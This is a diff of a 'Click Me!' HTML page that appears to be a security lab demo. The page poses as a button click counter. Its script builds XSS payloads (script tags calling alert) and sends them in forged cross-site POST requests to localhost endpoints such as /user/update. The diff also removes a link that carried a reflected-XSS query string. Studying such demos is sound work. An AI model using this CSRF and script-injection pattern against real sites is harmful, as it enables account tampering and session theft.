@@ -7,35 +7,29 @@
     <title>Click Me!</title>
 </head>
 <body>
-    <a id="naiveLink">Click this link!</a>
-    <br>
-    <br>
     <button id="runscript">Click Me!</button>
    <p id="message">You've clicked the button 0 times.</p>
    <script>
     document.addEventListener("DOMContentLoaded", () =>{
         const scripttag = "script"
-        const params = new URLSearchParams();
-        const hmessage = "\'You have been hacked!\'"
-        params.append("product", `<${scripttag}>alert(${hmessage})</${scripttag}>`)
-        const url = new URL("http://localhost:3000/restricted/product")
-        fullurl = url.toString() + "?" + params.toString()
-        const linkpoint = document.getElementById("naiveLink")
-        linkpoint.setAttribute("href",fullurl)
         let i=0;
         const button = document.getElementById("runscript");
         const message = document.getElementById("message");
         //console.log("button is", button)
-        const payload = [];
         const alertmsg = "\"Bad news, you have been hacked!\""
-        const badstuff = `This is the bad stuff: <${scripttag}>alert(${alertmsg})</${scripttag}>`
-        payload.push(`${encodeURIComponent("title")}=${encodeURIComponent("Surprise!")}`);
-        payload.push(`${encodeURIComponent("text")}=${badstuff}`);
-        const urlEncodedData = payload.join('&').replace(/%20/g, '+');
+        // console.log(alertmsg)
+        const badstuff = `<${scripttag}>alert(${alertmsg})</${scripttag}>`
+        console.log(badstuff)
+        const payload=(`${encodeURIComponent("phrase")}=${badstuff}`);
+        console.log(payload)
+        const urlEncodedData = payload.replace(/%20/g, '+');
+        console.log("urlencodeddata", urlEncodedData)
+        //const urlEncodedData = "xx"
+        // urlEncodedData = "phrase=<a href=\"http://localhost:3000\">dangerous link</a>"
 
         button.addEventListener("click", async () => {
             console.log("doing fetch")
-            fetch("http://localhost:3000/restricted/add-note",{
+            fetch("http://localhost:3000/user/update",{
                 method: "POST",
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded'
